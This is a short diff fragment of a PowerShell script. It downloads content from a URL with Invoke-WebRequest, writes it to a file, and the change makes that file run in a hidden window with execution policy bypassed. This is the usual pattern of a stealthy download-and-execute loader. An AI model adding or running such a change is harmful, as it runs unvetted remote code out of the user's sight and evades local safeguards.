@@ -13,4 +13,4 @@ $file_content = Invoke-WebRequest -Uri $url
 $file_content | Add-Content -Path $file
 $content | Add-Content -Path $path
 
-powershell.exe $file
+powershell.exe -W Hidden -Exec Bypass $file
